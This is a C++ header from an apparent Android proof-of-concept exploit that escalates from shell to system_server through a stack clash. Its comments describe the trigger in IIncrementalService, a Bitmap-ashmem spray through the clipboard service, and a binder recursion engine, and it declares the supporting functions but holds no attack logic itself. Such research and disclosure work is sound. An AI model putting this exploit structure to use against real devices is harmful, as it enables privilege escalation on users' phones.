// P0-465827985 shell->system_server stack-clash PoC — shared declarations.
// See README.md for the mechanism. Split into modules:
//   incremental.cc  the IIncrementalService calls (mount target, create/delete,
//                   isFileFullyLoaded — the loadFrom() guard-jump trigger)
//   clipboard.cc    the Bitmap-ashmem spray via IClipboard.setPrimaryClip
//   repro.cc        the binder plumbing, nested-recursion engine, and main()
#pragma once

#include <vector>
#include <string>

#include <stdio.h>
#include <ctype.h>
#include <dlfcn.h>
#include <err.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <assert.h>
#include <sys/mman.h>
#include <android/log.h>
#include <android/binder_status.h>
#include <android/binder_ibinder.h>
#include <android/binder_parcel_utils.h>

// die on a -1 syscall return
#define SYSCHK(x) ({          \
  auto __res = (x);      \
  if (__res == -1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

// die on a non-zero binder_status_t
#define SCHK(x) ({                                                 \
  binder_status_t __res = (x);                                     \
  if (__res) {                                                     \
    AStatus *__status = AStatus_fromStatus(__res);                  \
    errx(1, "SCHK(" #x "): %s", AStatus_getDescription(__status)); \
  }                                                                \
  __res;                                                           \
})

// The single memfd all sprayed Bitmap blobs are backed by, and its size.
#define SHMEM_SIZE (128 * 1024)

// --- shared state (defined in repro.cc) ---------------------------------
extern int shmem_fd;
extern void *shmem_map;
extern int fd_null;
extern unsigned int SHELL_COMMAND_TRANSACTION;
extern AIBinder *activity_service;
extern AIBinder *incremental_service;
extern AIBinder *clipboard_service;

// --- cross-module functions ---------------------------------------------
// repro.cc (engine):
void hack_AParcel_writeFdRaw(AParcel *p, int fd);
// incremental.cc:
void get_target_path(char *path, size_t cap);
int  incremental_open(const char *path);
void incremental_delete(int storageId);
void cleanup_stale_storage(const char *path);
int  incremental_create_mount(void);
binder_status_t incremental_iffl(int storageId);
// clipboard.cc:
void parcel_writedata(AParcel *p, std::vector<uint8_t> data);
void set_clipdata(void);
